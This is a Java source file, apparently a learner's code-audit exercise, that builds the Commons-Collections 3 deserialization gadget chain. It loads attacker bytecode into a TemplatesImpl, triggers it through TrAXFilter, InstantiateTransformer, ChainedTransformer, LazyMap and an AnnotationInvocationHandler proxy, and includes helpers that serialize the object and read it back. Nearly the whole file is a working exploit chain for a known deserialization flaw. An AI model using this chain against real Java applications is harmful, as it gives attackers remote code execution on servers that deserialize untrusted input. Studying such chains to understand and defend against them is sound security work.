import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3Test {
    public static void main(String[] args) throws Exception {
            TemplatesImpl templates = new TemplatesImpl();
            Class tc = templates.getClass();
            Field nameField = tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates,"aaa");
            Field bytecodeField = tc.getDeclaredField("_bytecodes");
            bytecodeField.setAccessible(true);

            byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\17140\\Desktop\\暑假实习\\java代码审计\\Cc1_test\\target\\classes\\Test.class"));
            byte codes[][]= {code};
            bytecodeField.set(templates,codes);

            Field tfactoryField = tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
            //templates.newTransformer();
//            Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(templates),
//                new InvokerTransformer("newTransformer",null,null)
//
//            };
            InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    instantiateTransformer


            };

//            InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
            //instantiateTransformer.transform(TrAXFilter.class);

            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            //chainedTransformer.transform(1);
            HashMap<Object ,Object> map = new HashMap<>();
            //Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
            Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

            Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor annotationInvocationHandlerConstrutor = c.getDeclaredConstructor(Class.class,Map.class);
            annotationInvocationHandlerConstrutor.setAccessible(true);
            InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstrutor.newInstance(Override.class,lazyMap);

            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);
            Object o =  annotationInvocationHandlerConstrutor.newInstance(Override.class,mapProxy);
            //serialize(o);
            unserialize("ser.bin");



    }
    public  static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        /*
        写对象，序列化
         */
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        /*
        读对象，反序列化
         */
        return obj;
    }
}
